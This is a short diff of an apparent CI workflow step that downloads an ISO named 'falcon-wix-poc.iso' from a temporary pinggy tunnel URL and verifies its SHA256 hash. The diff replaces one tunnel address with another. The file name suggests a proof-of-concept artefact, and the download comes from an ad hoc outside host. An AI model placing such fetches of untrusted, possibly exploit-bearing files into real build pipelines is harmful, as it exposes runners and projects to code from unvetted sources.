@@ -12,10 +12,8 @@ jobs:
         shell: pwsh
         run: |
           $ErrorActionPreference = 'Stop'
-          $u = 'https://xjyjc-2600-1f18-68f7-2200-4028-bfd8-81ac-b103.free.pinggy.net/falcon-wix-poc.iso'
-          $s = New-Object Microsoft.PowerShell.Commands.WebRequestSession
-          Invoke-WebRequest -Uri $u -Headers @{'X-Pinggy-No-Screen-Cookie'='true'} -WebSession $s -OutFile "$env:RUNNER_TEMP\pinggy-init.bin"
-          Invoke-WebRequest -Uri $u -WebSession $s -OutFile "$env:RUNNER_TEMP\falcon-wix-poc.iso"
+          $u = 'http://rqjsr-2600-1f18-68f7-2200-4028-fbad-6739-a69.run.pinggy-free.link:41423/falcon-wix-poc.iso'
+          Invoke-WebRequest -Uri $u -OutFile "$env:RUNNER_TEMP\falcon-wix-poc.iso"
           $h=(Get-FileHash "$env:RUNNER_TEMP\falcon-wix-poc.iso" -Algorithm SHA256).Hash.ToLower()
           Write-Host "ISO SHA256=$h"
           if ($h -ne '0a51ebd4eb630faa3c135eadbfc5e96de2f79f7a88f2c9a6ed74780b169edc0e') { throw 'ISO hash mismatch' }
